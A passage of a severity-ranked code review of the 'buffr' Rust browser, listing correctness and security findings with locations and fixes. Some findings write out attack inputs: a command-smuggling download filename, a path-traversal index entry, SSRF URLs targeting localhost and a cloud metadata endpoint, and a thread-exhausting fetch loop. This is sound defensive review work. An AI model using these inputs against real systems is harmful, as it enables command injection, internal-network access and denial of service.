# Code Review

Full-codebase review of buffr at `v0.14.6` (commit `3eb8840`). Covers every
crate in the workspace, both excluded crates (`buffr-webkit`, `buffr-poc`), the
supervisor and helper binaries, `xtask`, CI workflows, config schema, and docs.

`cargo clippy --all-targets --workspace -- -D warnings` is clean, so nothing
here is a lint the compiler already catches. Findings are grouped by severity;
duplicates that surfaced from more than one angle are merged.

**Legend** — `ACTIONABLE: yes` means the fix is mechanical and needs no product
decision. `needs-decision` means someone has to choose the intended behaviour
first.

---

## Summary

| Severity | Count                              |
| -------- | ---------------------------------- |
| Critical | 0                                  |
| High     | 14                                 |
| Medium   | 55 (+ 8 in the excluded `-webkit`) |
| Low      | 46 (+ 2 in the excluded `-webkit`) |

Themes that recur across crates:

1. **Char-boundary slicing on untrusted text** — three separate panics reachable
   from a page title, a permission origin, or a `config.toml` typo.
2. **Unauthenticated renderer→browser IPC** — the `console.log` sentinel channel
   has no nonce, so any page can forge hint/edit/media-probe events.
3. **Copy-paste divergence** — the same helper exists in 3–5 places and the
   copies have already drifted apart (that is exactly how finding H1 happened).
4. **Local-user attack surface in `/tmp`** — the single-instance socket and the
   supervisor clean-shutdown flag both land on predictable, world-writable
   paths.
5. **Unix/Windows supervisor forks** — the Windows half is missing fixes the
   Unix half already has.
6. **Docs and `config.example.toml` drift** — several documented knobs are
   parsed but never read, and several documented keybindings do not exist.

---

## High

### H1. `truncate_to_width` slices before the char-boundary check — panic on any non-ASCII permission origin

- **Category:** correctness
- **Location:** `crates/buffr-ui/src/permissions_prompt.rs:150`
- **Problem:** Lines 150–154 compute `let prefix = &s[..end];` _before_ the
  `if !s.is_char_boundary(end)` guard. The three sibling copies (`lib.rs:345`,
  `tab_strip.rs:417`, `download_notice.rs:148`) have the guard first; this copy
  has them swapped.
  `truncate_to_width("https://héllo.example wants: camera", 30)` panics with
  `byte index 10 is not a char boundary`. The string is
  `format!("{origin} wants: {caps}")` where `origin` is CEF's
  `requesting_origin` (`crates/buffr-cef/src/handlers.rs:1390`) —
  page-controlled.
- **Fix:** Move the `is_char_boundary` check above the slice; better, delete
  this copy entirely (see M32).
- **ACTIONABLE:** yes

### H2. `parse_hex_rgb` byte-slices a config string — a typo hard-panics startup

- **Category:** correctness
- **Location:** `crates/buffr-config/src/lib.rs:220`
- **Problem:** The guard is `s.len() != 7` (bytes) plus `starts_with('#')`, then
  `&s[1..3]`, `&s[3..5]`, `&s[5..7]` at fixed byte offsets. A 7-_byte_ string
  containing a multi-byte char passes the guard and splits a codepoint:
  `parse_hex_rgb("#a€aa")` panics. Called on every `[theme]` field at startup
  (`apps/buffr-app/src/main.rs:121-127`), whose doc comment explicitly promises
  "a stray typo never crashes startup".
- **Fix:** Guard on `s.is_ascii()` before slicing, or use `s.get(1..3)?`.
- **ACTIONABLE:** yes

### H3. view-source slices a lossy-decoded string with raw-byte offsets

- **Category:** correctness
- **Location:** `crates/buffr-view-source/src/lib.rs:122`
- **Problem:** `spans` come from `highlighter.highlight(source)` and index the
  raw `&[u8]`. Those offsets then slice `text = String::from_utf8_lossy(source)`
  at lines 122, 128, 137. For non-UTF-8 input each invalid byte becomes a 3-byte
  U+FFFD, so `text` is longer than `source` and the offsets land
  mid-replacement-character → panic. Repro: `view-source:` on any file served as
  Latin-1 or containing a stray `0xFF`. There is also no guard that spans are
  sorted, non-overlapping, or that `range.end <= text.len()`.
- **Fix:** Lossy-decode once up front and highlight `decoded.as_bytes()` so
  offsets and string agree; clamp/validate each range with `text.get(a..b)`.
- **ACTIONABLE:** yes

### H4. Update checker compares against `buffr-core`'s version, not the app's

- **Category:** correctness
- **Location:** `crates/buffr-core/Cargo.toml:4`,
  `crates/buffr-core/src/updates.rs:177`
- **Problem:** `buffr-core` declares `version = "0.7.0"` instead of
  `version.workspace = true` (workspace is `0.14.6`). `UpdateChecker::new` seeds
  `current` from `env!("CARGO_PKG_VERSION")`, and its comment ("The workspace
  version is shared so this matches `buffr` itself") is false. `resolve_status`
  evaluates `0.14.6 <= 0.7.0` → false, so an up-to-date user permanently sees
  the `* upd` statusline nag. The same wrong string leaks into `crash.rs:216`
  (`buffr_version: "0.7.0"` on every crash report) and the
  `User-Agent: buffr/0.7.0` at `updates.rs:47` and `image_copy.rs:28`.
- **Fix:** `version.workspace = true` in `crates/buffr-core/Cargo.toml`.
- **ACTIONABLE:** yes

### H5. Renderer can forge buffr's console-log IPC (hint / edit / media-probe)

- **Category:** security
- **Location:** `crates/buffr-cef/src/handlers.rs:957`,
  `crates/buffr-core/src/hint.rs:442`, `crates/buffr-core/src/edit.rs:176`,
  `crates/buffr-core/src/media_probe.rs:42`
- **Problem:** `on_console_message` scrapes three fixed, publicly-documented
  sentinel prefixes out of _any_ console line from _any_ frame — including
  third-party ad iframes — with no nonce and no origin check. The parsers use
  `message.find(SENTINEL)`, so the sentinel may appear anywhere in the line.
  Consequences: a page emitting `__buffr_hint__:{"kind":"ready",…}` overwrites
  the live `HintSession` so the user's next hint keystroke clicks an
  attacker-chosen element; `__buffr_media__:{"video":true}` in a loop pins the
  platform idle inhibitor on so the screen never locks
  (`apps/buffr-app/src/main.rs:8613`); `__buffr_edit__:{"type":"selection",…}`
  pushes arbitrary text into the yank-to-clipboard path.
- **Fix:** Mint a per-load random nonce, splice it into the injected JS
  alongside the existing placeholders, require `SENTINEL + nonce` on the Rust
  side, and anchor the parse to the start of the message rather than `find`.
- **ACTIONABLE:** yes

### H6. Chromium sandbox disabled process-wide

- **Category:** security
- **Location:** `crates/buffr-cef/src/lib.rs:149`,
  `crates/buffr-cef/src/app.rs:177`
- **Problem:** `Settings { no_sandbox: 1, … }` plus a redundant
  `append_switch(command_line, "no-sandbox")` disables the renderer sandbox for
  every subprocess. Any renderer-side RCE becomes immediate arbitrary code
  execution as the user, with access to the whole profile and filesystem.
  `ignore-gpu-blocklist` (`app.rs:174`) widens the GPU-driver attack surface on
  top of that.
- **Fix:** Ship the setuid `chrome-sandbox` helper (or rely on user-namespace
  sandboxing) and drop both switches; if the sandbox must stay off on a specific
  platform, gate it per-target.
- **ACTIONABLE:** needs-decision

### H7. Windows "open on finish" shells through `cmd /c start` with an attacker-controlled filename

- **Category:** security
- **Location:** `crates/buffr-core/src/open_finder.rs:84`
- **Problem:** `command_for` builds `cmd.exe /c start "" <path>`. Rust quotes
  arguments per `CommandLineToArgvW` rules, which `cmd.exe` does **not** follow
  — it re-parses `&`, `|`, `^`, `<`, `>`, `"` after unquoting. `path` derives
  from the download's suggested filename (URL / `Content-Disposition`, both
  server-controlled). A file saved as `report"&calc.exe&".pdf` yields a command
  line `cmd.exe` splits into a second command, executed when
  `open_on_finish = true`.
- **Fix:** Don't route through `cmd.exe`. Use `ShellExecuteW(NULL, "open", …)`
  via `windows-sys`, or at minimum `explorer.exe <path>`.
- **ACTIONABLE:** yes

### H8. Chrome updates are silently lost when the render worker skips a frame

- **Category:** correctness
- **Location:** `apps/buffr-app/src/main.rs:4424` (and `main.rs:6375` for
  popups)
- **Problem:** `Renderer::frame` returns `Ok(...)` on five paths that never
  upload chrome pixels: the `frames_in_flight > 0` skip (`render.rs:1031-1037`),
  `TrySendError::Full` (`render.rs:1182-1186`), and the Timeout / Occluded /
  Validation / stale-size skips (`render.rs:1132`, `1137`, `1141`, `1155`,
  `1159`). `paint_chrome_with` then unconditionally does
  `if chrome_dirty_effective { self.last_painted_chrome_gen = self.chrome_generation; }`,
  erasing the dirty state. Repro: type into the omnibar on a frame where the
  wgpu worker is still presenting — the character never appears until an
  unrelated event marks chrome dirty again. `paint_popup_window` mirrors the
  bug.
- **Fix:** Have `Renderer::frame` report whether the command was actually
  submitted (`Result<(FrameStats, Submitted)>`) and only advance
  `last_painted_chrome_gen` / `last_osr_generation` when it was.
- **ACTIONABLE:** yes

### H9. Permission resolve aborts before firing the CEF callback when the store write fails

- **Category:** correctness
- **Location:** `crates/buffr-cef/src/permissions.rs:186` (and `:203`)
- **Problem:** `PendingPermission::resolve` persists with
  `store.set(&origin, *cap, decision)?` _before_ invoking the C++ callback. A
  single sqlite error (disk full, locked db, poisoned pool) propagates via `?`,
  so `callback.cont(...)` / `callback.cancel()` never runs and the
  `MediaAccessCallback` is dropped un-invoked — wedging the renderer. The doc
  comment three lines above claims "The handler's `Drop` impl below guards
  against that"; there is no `Drop` impl anywhere in the file.
- **Fix:** Capture the store error in a local, always invoke the callback, then
  return the error. Or add a real `Drop for PendingPermission` that fires
  `cancel()` if unresolved.
- **ACTIONABLE:** yes

### H10. Unbounded memory read on a single HTTP header line (internal server)

- **Category:** security
- **Location:** `crates/buffr-engine/src/internal_server.rs:298`
- **Problem:** The request line is capped at 32 KiB by hand, but the
  header-drain loop uses `reader.read_line(&mut line)?`, which grows `line`
  without bound; the `header_bytes > 16 * 1024` guard at line 306 only runs
  _after_ a complete line has been buffered. Verified:
  `GET /<token>/new HTTP/1.1\r\nX: ` followed by 64 MiB of `a` with no newline
  is accepted in full. Any local process — or any web page that guesses the
  port, since a cross-origin `fetch` still transmits the request — drives the
  browser to OOM.
- **Fix:** Wrap the stream in `reader.by_ref().take(16 * 1024)` before the
  header loop and return 413 when the limit is hit mid-line.
- **ACTIONABLE:** yes

### H11. Abandoned multi-chord prefix never flushes; the next keystroke is swallowed

- **Category:** correctness
- **Location:** `crates/buffr-modal/src/engine.rs:276`
- **Problem:** `tick` does `resolve_timeout(...)?`. When the pending buffer is a
  _pure_ prefix (a node with children but no action of its own)
  `resolve_timeout` returns `None`, so `tick` returns early and never clears
  `pending` / `pending_started`. With the shipped defaults: press `g` (prefix of
  `gg`/`gt`/`gT`/`gi`), wait any length of time, then press `j` — the engine
  looks up `[g, j]`, gets `NoMatch`, returns `Reject`, and the page does not
  scroll. Vim flushes the prefix at `timeoutlen`.
- **Fix:** In `tick`, when `now >= started + timeout`, call `reset_pending()`
  before returning regardless of whether `resolve_timeout` produced an action.
- **ACTIONABLE:** yes

### H12. Heartbeat UI-liveness timeout never restarts the child — supervisor blocks in `child.wait()` forever

- **Category:** correctness
- **Location:** `apps/buffr/src/main.rs:668`,
  `apps/buffr-app/src/heartbeat.rs:160`
- **Problem:** `heartbeat.rs:160-168` handles a hung UI by stopping pings and
  **returning** from `run_heartbeat_loop`, dropping the `UnixStream`. The
  supervisor sees EOF → `HeartbeatEvent::Disconnected` → `watch_heartbeat`
  returns `false` (not a hang) → `child.try_wait()` is `None` (line 328) →
  `child.wait()` (line 358) blocks forever on a still-running, frozen browser.
  The documented contract (`heartbeat.rs:8-10`) never fires.
- **Fix:** Treat `Disconnected` while the child is still alive as a hang, or
  keep the socket open in the heartbeat thread and simply stop writing.
- **ACTIONABLE:** yes

### H13. `try_bind` unconditionally deletes the singleton socket, producing two "single" instances

- **Category:** correctness
- **Location:** `apps/buffr-app/src/single_instance.rs:223`
- **Problem:** `try_forward` maps _every_ connect error to "no server"
  (catch-all at lines 179-183), and `try_bind` then unlinks whatever socket file
  exists before binding. Two simultaneous launches both fail to connect, A
  binds, B unlinks A's socket and binds its own — both processes believe they
  own the profile, and A's `SingletonHandle::drop` later unlinks B's socket. A
  transient `EAGAIN` against a live-but-busy singleton has the same effect.
- **Fix:** Only remove the socket after a connect that returned
  `NotFound`/`ConnectionRefused`, and bind atomically (bind to a temp name +
  `rename`) instead of unlink-then-bind.
- **ACTIONABLE:** yes

### H14. Single-instance socket and supervisor clean-flag live on predictable world-writable paths

- **Category:** security
- **Location:** `apps/buffr-app/src/single_instance.rs:142`,
  `apps/buffr/src/main.rs:268`
- **Problem:** When `XDG_RUNTIME_DIR` is unset (headless/ssh Linux sessions,
  always on macOS) the singleton path is
  `temp_dir()/buffr-<uid>-<profile_id>.sock`, where `profile_id` is
  `sha256(cache_path)[0..8]` — fully derivable by any local user. An attacker
  who binds that path first receives every subsequent `buffr <url>` invocation's
  URL list, replies `OK`, and the victim's browser silently exits 0 without
  opening. There is no `SO_PEERCRED` check on the accept side. Separately, the
  supervisor clean-shutdown flag falls back to `/tmp/buffr-<pid>.clean` and is
  checked with `Path::exists()`, which follows symlinks — another local user can
  pre-create it and permanently disable the crash watchdog; squatting
  `/tmp/buffr-<pid>.sock` first also makes `bind` fail, silently downgrading to
  "no hang detection".
- **Fix:** Create a `0700` per-uid directory with `O_EXCL`, verify owner+mode
  after creation, and place both files inside it. Verify
  `SO_PEERCRED`/`getpeereid` uid == our uid before honouring a payload. Stat the
  clean flag with `symlink_metadata` and require a regular file owned by our
  uid.
- **ACTIONABLE:** yes

---

## Medium

### M1. CEF tarball downloaded and extracted with no integrity check; remote JSON controls the write path

- **Category:** security
- **Location:** `xtask/src/main.rs:262`
- **Problem:** `file.name` comes straight from the remote `index.json` and is
  used both as a URL suffix and as a filesystem path component
  (`vendor_dir.join(&file.name)`), so a malicious index entry named
  `../../.cargo/config.toml` writes outside `vendor/cef/`. The `sha1` field from
  the same index is parsed and then explicitly discarded (`#[allow(dead_code)]`,
  lines 111-112), so the ~200 MB blob that becomes `libcef.so` in every shipped
  package is never verified.
- **Fix:** Reject `file.name` containing `/`, `\`, or `..` (or use only its
  `file_name()`); hash the archive and compare against `file.sha1` before
  `extract_tar_bz2`, failing hard on mismatch.
- **ACTIONABLE:** yes

### M2. Windows supervisor misreads `STILL_ACTIVE` (259) as an exit code and spawns a second browser

- **Category:** correctness
- **Location:** `apps/buffr/src/main.rs:989`
- **Problem:** `watch_heartbeat` returns `false` on `Disconnected` (line 1435)
  while the process is still running; `get_exit_code` then calls
  `GetExitCodeProcess`, which succeeds and returns `STILL_ACTIVE` (259). The
  supervisor records `ChildExited(Some(259))`, treats it as a crash, closes the
  handle and spawns another `buffr-app` — a UI hang on Windows produces two live
  browsers instead of a restart, up to the 3-strike limit.
- **Fix:** Gate `get_exit_code` behind
  `WaitForSingleObject(h, 0) == WAIT_OBJECT_0` (reuse `process_exited`), and
  kill + wait for the child before treating the pipe disconnect as an exit.
- **ACTIONABLE:** yes

### M3. Windows supervisor restarts on any non-zero exit, so a CLI error becomes a 3× restart loop

- **Category:** correctness
- **Location:** `apps/buffr/src/main.rs:1015`
- **Problem:** The Unix path deliberately propagates a normal non-zero exit
  without restarting (lines 421-432, "likely CLI or config error"). The Windows
  path only checks `ChildExited(Some(0))`; `buffr --bogus-flag` on Windows
  re-runs the failing child three times and exits 1 with a misleading "3
  crashes/hangs" message. The clean-shutdown flag is also Unix-only, so a
  segfault during CEF teardown after the user closes the window respawns the
  browser on Windows.
- **Fix:** Mirror the Unix exit-code branch and the clean-flag file in
  `windows::run_supervisor`.
- **ACTIONABLE:** yes

### M4. `--heartbeat-disable` (or a bind failure) silently disables clean-shutdown detection

- **Category:** correctness
- **Location:** `apps/buffr/src/main.rs:268`
- **Problem:** `clean_flag_path` is derived from `sock_path`, so when the
  heartbeat is disabled or the bind fails, no `BUFFR_SUPERVISOR_CLEAN_FLAG` is
  passed to the child. A user closing the window and then segfaulting during
  CEF/wgpu teardown — the exact case the flag exists for — is classified as a
  crash and relaunched up to three times.
- **Fix:** Compute the clean-flag path independently of the heartbeat socket.
- **ACTIONABLE:** yes

### M5. `Instant - Duration` panics when the supervisor crashes within 30 s of boot

- **Category:** correctness
- **Location:** `apps/buffr/src/main.rs:440` (and `:1038` on Windows)
- **Problem:** `let window_start = now - Duration::from_secs(WINDOW_SECS);` —
  `Sub<Duration> for Instant` panics with "overflow when subtracting duration
  from instant". On Linux `Instant` is `CLOCK_MONOTONIC` (since boot), so a
  browser autostarted at login on a fast-booting machine that crashes in the
  first 30 s takes down the supervisor with a panic instead of restarting.
- **Fix:** `now.checked_sub(...)` and retain everything when it returns `None`.
- **ACTIONABLE:** yes

### M6. Signal-forwarding thread leaked on every restart; keeps `killpg`-ing a dead PID

- **Category:** correctness
- **Location:** `apps/buffr/src/main.rs:303`
- **Problem:** `install_signal_forwarding` is called once per loop iteration and
  its `JoinHandle` is bound to `_signal_guard`, dropped (detached) at the end of
  the iteration while the thread blocks forever in `signals.forever().next()`.
  After N restarts there are N live threads, each with a stale `child_pid`. A
  SIGTERM after two restarts wakes all three; two call `killpg` on reaped PIDs —
  under PID reuse that signals an unrelated process group.
- **Fix:** Install the handler once outside the loop; read the current child pid
  from an `AtomicI32` updated per spawn.
- **ACTIONABLE:** yes

### M7. Heartbeat accept thread and its listener fd leak on every connect-timeout restart

- **Category:** correctness
- **Location:** `apps/buffr/src/main.rs:517`
- **Problem:** `heartbeat_accept_loop` polls `listener.accept()` with 50 ms
  sleeps and only exits on a successful accept or a hard error — it never
  observes that the `Receiver` was dropped. On `ConnectResult::TimedOut` the
  supervisor moves on but the thread spins at 20 Hz forever holding the
  `UnixListener` fd; one thread + fd leaks per restart.
- **Fix:** Give the accept loop a deadline or a shared `AtomicBool` cancel flag.
- **ACTIONABLE:** yes

### M8. Windows child command line is built without quoting

- **Category:** correctness
- **Location:** `apps/buffr/src/main.rs:1219`
- **Problem:** `spawn_child_suspended` quotes only the binary; every forwarded
  argument is appended raw. `buffr "C:\My Docs\page.html"` reaches `buffr-app`
  as two arguments, and an argument containing `"` lets a caller inject
  additional flags into the child's command line.
- **Fix:** Apply the MSVCRT quoting rule (wrap in `"`, escape embedded `"` and
  trailing backslashes) per argument.
- **ACTIONABLE:** yes

### M9. `std::env::set_var` on the Windows spawn path runs while other threads are live

- **Category:** correctness
- **Location:** `apps/buffr/src/main.rs:1228`
- **Problem:** The pipe path is passed to the child by mutating the supervisor's
  own environment around `CreateProcessW`, with a safety comment claiming a
  "single-threaded context". On restart iterations that is false — the previous
  iteration's `heartbeat_pipe_loop` thread may still be running, making
  `set_var`/`remove_var` (line 1267) a data race.
- **Fix:** Build an explicit environment block and pass it as `CreateProcessW`'s
  `lpEnvironment`.
- **ACTIONABLE:** yes

### M10. IPC accept loop has no read timeout and an unbounded `read_line`

- **Category:** security
- **Location:** `apps/buffr-app/src/single_instance.rs:305`
- **Problem:** The accepted stream gets no recv timeout, and `read_line` into a
  `String` is unbounded. A client that connects and never writes blocks the
  accept loop indefinitely, so every subsequent `buffr <url>` hangs at
  `try_forward`; a client streaming bytes with no `\n` grows the `String` until
  OOM. `MAX_FORWARD_URLS`/`MAX_FORWARD_URL_LEN` apply only after the whole line
  is buffered.
- **Fix:** Set a recv timeout per accepted stream and read through
  `(&stream).take(MAX_FORWARD_URLS * MAX_FORWARD_URL_LEN + slack)`.
- **ACTIONABLE:** yes

### M11. Unbounded thread-per-connection on the internal server

- **Category:** security
- **Location:** `crates/buffr-engine/src/internal_server.rs:237`
- **Problem:** `accept_loop` spawns a fresh OS thread per accepted connection
  with no cap and no backpressure. A connection that sends nothing pins its
  thread for the full 2 s read timeout. A page doing
  `for (…) fetch('http://127.0.0.1:PORT/')` spawns thousands of live threads
  (the request is sent even though CORS blocks reading the response); once
  `spawn` starts failing the loop only logs a warning and keeps accepting.
- **Fix:** Bound in-flight connections with a semaphore/`AtomicUsize` checked
  before spawn (reply 503 over the cap), or use a fixed worker pool.
- **ACTIONABLE:** yes

### M12. `InternalServer::drop` can hang the process forever

- **Category:** correctness
- **Location:** `crates/buffr-engine/src/internal_server.rs:202`
- **Problem:** Shutdown relies on a self-connect to break the blocking `accept`;
  the result is discarded and `handle.join()` blocks unconditionally. If
  `connect_timeout` fails — exactly what happens once the backlog is saturated
  by M11, or under load past the 100 ms timeout — the accept thread stays parked
  in `accept()` and `join()` never returns; the browser hangs on exit.
- **Fix:** `set_nonblocking(true)` and poll the shutdown flag (which the code's
  own comments at 213 and 219-221 already claim it does), so `accept` returns
  `WouldBlock` and the loop exits on its own.
- **ACTIONABLE:** yes

### M13. `buffr-src:` handler fetches any URL with no scheme/host allowlist (SSRF from renderer)

- **Category:** security
- **Location:** `crates/buffr-cef/src/view_source_scheme.rs:271`
- **Problem:** `buffr-src` is registered with `CORS_ENABLED | FETCH_ENABLED`
  (lines 32-35), making it reachable from ordinary web content via navigation,
  iframe, or `fetch()`. `fetch_and_render` then does `agent.get(url).call()` on
  whatever followed the prefix with zero validation — the request originates
  from the browser process, outside Chromium's network stack, so it bypasses
  same-origin policy, CSP, and private-network-access checks.
  `buffr-src:http://127.0.0.1:8080/admin` or
  `buffr-src:http://169.254.169.254/latest/meta-data/` reaches internal
  endpoints and renders the body as a document.
- **Fix:** Reject any underlying URL whose scheme is not `http`/`https`, and
  only serve requests whose CEF transition indicates a top-level
  browser-initiated navigation — or gate the scheme behind a one-shot token
  minted by `BrowserHost` when the user picks "view page source".
- **ACTIONABLE:** yes

### M14. Unbounded thread spawn per `buffr-src:` request

- **Category:** correctness
- **Location:** `crates/buffr-cef/src/view_source_scheme.rs:149`
- **Problem:** `open` does `std::thread::spawn` per request with no cap.
  Combined with `FETCH_ENABLED` above, a page running
  `for (let i=0;i<50000;i++) fetch('buffr-src:https://x/'+i)` spawns 50k OS
  threads, each with a 10 s connect + 10 s recv timeout, hanging the browser.
- **Fix:** Dispatch onto a bounded worker pool (or `cef::post_task` onto CEF's
  FILE_USER_BLOCKING thread) and fail with an error page when saturated.
- **ACTIONABLE:** yes

### M15. Lock-order inversion between `tabs` and `active`

- **Category:** correctness
- **Location:** `crates/buffr-cef/src/host.rs:1447`
- **Problem:** `set_active_index` takes `self.active` then `self.tabs` (1447,
  1451); so do `enforce_pinned_ordering` (1879, 1882) and `toggle_pin_active`
  (1844, 1845). Every other path takes them in the opposite order —
  `with_active` (1971, 1972), `active_tab` (1509, 1510), `osr_mouse_move` (926,
  927), `hint_status` (2205, 2206), `move_tab` (1783, 1806), `open_tab_at`
  (1250, 1261). `BrowserHost` is handed out as `Arc<dyn BrowserEngine>`
  (`Send + Sync`), so the moment a second thread calls any engine method, thread
  A in `with_active` and thread B in `set_active_index` deadlock the UI
  permanently. Latent today only because the apps layer happens to be
  single-threaded.
- **Fix:** Fix one order (`tabs` → `active`) everywhere; better, collapse both
  fields into one `Mutex<TabStrip { tabs, active }>`.
- **ACTIONABLE:** yes

### M16. Concurrent `window.open()` loses popups and leaks a live CEF browser

- **Category:** correctness
- **Location:** `crates/buffr-cef/src/handlers.rs:299`
- **Problem:** `on_before_popup` stashes `(frame, view, url)` into a one-element
  slot and `on_after_created` consumes it with `slot.take()`. A page calling
  `window.open()` twice in one task fires `on_before_popup` twice before the
  first `on_after_created`, so the second alloc overwrites the first. The first
  popup gets the second's frame/URL; the second finds `None`, logs "no pending
  alloc for popup — skipping" and returns. That popup is never inserted into
  `popup_frames`/`popup_browsers`, renders nothing, and is missed by
  `close_all_browsers` at shutdown — a live CEF browser leaked into
  `cef::shutdown()`.
- **Fix:** Make `pending_popup_alloc` a FIFO `VecDeque`, or key the alloc by the
  `popup_id` `on_before_popup` already receives.
- **ACTIONABLE:** yes

### M17. `on_paint` builds a slice from an unvalidated pointer and unvalidated dimensions

- **Category:** security
- **Location:** `crates/buffr-cef/src/osr.rs:159`
- **Problem:** `std::slice::from_raw_parts(buffer, len)` runs with no null check
  on `buffer` and no bounds check on the `c_int` `width`/`height`.
  `from_raw_parts(null, 0)` is UB even at zero length, and a negative `width`
  sign-extends through `width as u32` into a ~4-billion-element `len`. The slice
  is also constructed _before_ `resolve_frame_view` decides whether the paint is
  routable at all.
- **Fix:** Early-return when `buffer.is_null() || width <= 0 || height <= 0`,
  and move the `from_raw_parts` below the `resolve_frame_view` match.
- **ACTIONABLE:** yes

### M18. Memory leak: `cef_string_list_value` output is never freed

- **Category:** correctness
- **Location:** `crates/buffr-cef/src/handlers.rs:877`
- **Problem:** `cef_string_list_value(raw, i, &mut value)` calls
  `cef_string_set(..., copy=true)` internally, heap-allocating and installing a
  dtor on `value`. The code then builds a `CefStringUtf16` from
  `std::ptr::from_ref(&value)`, which lands in the `Borrowed` arm;
  `CefStringUtf16::Drop` only frees the `Clear` arm, so `value.dtor` never runs.
  Every `on_favicon_urlchange` leaks one UTF-16 buffer per icon URL — an SPA
  that swaps its favicon per route leaks continuously.
- **Fix:** `cef::sys::cef_string_utf16_clear(&mut value)` at the end of each
  loop iteration, including the `continue` path.
- **ACTIONABLE:** yes

### M19. Closing and reopening a `buffr://` tab leaks the InternalServer auth token

- **Category:** security
- **Location:** `crates/buffr-cef/src/host.rs:1722`
- **Problem:** `close_index` calls `forget_display_url(removed.id)`
  unconditionally, but the stashable branch (line 1729) keeps the `Tab` alive on
  the undo stack. After `reopen_closed_tab` the override is gone, so `summarize`
  and `active_tab_live_url` fall back to `t.url`, which `pump_address_changes`
  has already overwritten with `http://127.0.0.1:<port>/<token>/new`. Repro:
  open `buffr://new`, `d` to close, `u` to reopen — the address bar shows the
  token, and it is written to the session file.
- **Fix:** Move `forget_display_url` into the non-stashable branch and the
  stack-eviction loop; carry the override inside `ClosedTab` so reopen restores
  it.
- **ACTIONABLE:** yes

### M20. IME selection range passed as byte offsets instead of UTF-16 units

- **Category:** correctness
- **Location:** `crates/buffr-cef/src/host.rs:2671`
- **Problem:** `ime_set_composition` computes `let end = text.len() as u32`
  (UTF-8 bytes) and passes it as `cef::Range`. CEF's `selection_range` is in
  UTF-16 code units. A 3-character Japanese preedit `"こんに"` has
  `text.len() == 9` but a UTF-16 length of 3, so CEF gets an out-of-range
  selection on exactly the input class IME exists to support.
- **Fix:** `text.encode_utf16().count() as u32`, and convert caller-supplied
  byte offsets with `text[..s].encode_utf16().count()`.
- **ACTIONABLE:** yes

### M21. Non-base64 `data:` URLs are corrupted — every byte ≥ 0x80 is re-encoded

- **Category:** correctness
- **Location:** `crates/buffr-core/src/image_copy.rs:121`
- **Problem:** `percent_decode` accumulates into a `String` via
  `out.push(byte as char)`, mapping each byte to that Unicode scalar.
  `into_bytes()` (line 108) then UTF-8-encodes it, so `%89` becomes `0xC2 0x89`.
  Repro: "Copy Image" on `data:image/png,%89PNG%0D%0A%1A%0A…` — the PNG magic is
  mangled and `transcode_to_png` fails. Every non-base64 binary `data:` image is
  unrecoverable. Line 125 has the same defect for literal high bytes.
- **Fix:** Return `Vec<u8>` and push raw bytes; drop the `into_bytes()`.
- **ACTIONABLE:** yes

### M22. Crash reports silently overwrite each other

- **Category:** correctness
- **Location:** `crates/buffr-core/src/crash.rs:269`
- **Problem:** The comment (lines 263-264) says the pattern is
  `<RFC3339>_<u32>.json`, but the code emits `format!("{stamp}.json")` with only
  millisecond precision and no counter, and `fs::write` truncates. Two threads
  panicking within the same millisecond — common when a shared resource fails
  and several workers unwind together — means the second report clobbers the
  first. There is also no cap on report count; `purge_older_than` is age-based
  only.
- **Fix:** Append a process-static `AtomicU64` counter or the thread id, and/or
  use `create_new(true)` with retry.
- **ACTIONABLE:** yes

### M23. Integer overflow on `pixel_count * 4` when reading a corrupted favicon row

- **Category:** correctness
- **Location:** `crates/buffr-core/src/favicon_cache.rs:164`
- **Problem:** Line 163 defensively uses `saturating_mul`, but lines 164 and 167
  then do a plain `pixel_count * 4`. A `favicons` row with
  `width = height = 4294967295` (reachable via a corrupted or externally-written
  `favicon-cache.db`) saturates `pixel_count` to `usize::MAX`, and
  `usize::MAX * 4` panics in debug / wraps in release, defeating the very length
  check it guards. `[profile.release]` does not enable `overflow-checks`.
- **Fix:** `let expected = pixel_count.saturating_mul(4);` and compare against
  that. Also reject implausible dimensions (`> 1024`) before allocating.
- **ACTIONABLE:** yes

### M24. Favicon blit bounds check can overflow before it checks

- **Category:** correctness
- **Location:** `crates/buffr-ui/src/tab_strip.rs:468`
- **Problem:** `if src_pixels.len() < src_w * src_h { return; }` multiplies two
  `usize` values derived from the public
  `TabFavicon { width: u32, height: u32 }` fields. With mis-decoded dimensions
  the product wraps in release, the guard passes, and the loop indexes
  `src_pixels[row0 + sx0]` (line 522) out of bounds. Nothing enforces
  `pixels.len() == width * height`.
- **Fix:** `let Some(needed) = src_w.checked_mul(src_h) else { return };`
- **ACTIONABLE:** yes

### M25. `truncate_to_width` is O(n²) — a long URL stalls every repaint

- **Category:** correctness
- **Location:** `crates/buffr-ui/src/lib.rs:340`
- **Problem:** The loop decrements `end` one _byte_ at a time and calls
  `font::text_width(&s[..end])` (an O(end) `chars().count()`) each iteration —
  O(n²) byte scans, re-run every frame the chrome is dirty. A 1 MB `data:` URL
  costs ~10¹² operations per repaint and freezes the UI. All four copies share
  it.
- **Fix:** Walk `char_indices()` forward accumulating width, or binary-search
  the boundary — both O(n).
- **ACTIONABLE:** yes

### M26. `truncate_to_width` reserves space for `..` but never renders it

- **Category:** correctness
- **Location:** `crates/buffr-ui/src/lib.rs:330`
- **Problem:** The doc says "Adds a trailing `..` ellipsis" and the fit test at
  line 346 subtracts `font::text_width("..")` from the budget, but the function
  returns the bare prefix and no caller appends the dots. Truncated URLs, tab
  titles, and download paths are silently cut with no marker, and ~13 px of
  every cell is wasted. The test `truncate_to_width_drops_chars_until_fit`
  (line 726) locks in the wrong behaviour.
- **Fix:** Append `".."` and update the tests, or drop `..` from the budget.
- **ACTIONABLE:** yes

### M27. Text layout assumes one fixed advance per `char` — CJK renders overlapped

- **Category:** correctness
- **Location:** `crates/buffr-ui/src/font.rs:99`
- **Problem:** `text_width` is `s.chars().count() * (glyph_w() + 1) - 1` and
  `draw_text` advances by the same constant, using the advance width of `'M'`.
  Full-width CJK glyphs are ~2× that, so a Japanese/Chinese tab or page title
  draws each glyph atop the previous one, and every truncation/centering
  computation under-measures by ~2× so the text overflows its cell. Combining
  marks get a full cell each.
- **Fix:** Accumulate a real pen position from
  `f.font.metrics(c, TARGET_PX).advance_width` and advance `draw_text` by the
  same per-glyph value.
- **ACTIONABLE:** yes

### M28. Glyph cache `unwrap()` turns one rasterizer panic into a permanently dead UI

- **Category:** correctness
- **Location:** `crates/buffr-ui/src/font.rs:130`
- **Problem:** `f.cache.lock().unwrap()` panics on a poisoned mutex, and
  `or_insert_with` calls `f.font.rasterize(...)` _while holding the lock_. Any
  panic inside fontdue for one pathological glyph poisons the cache permanently
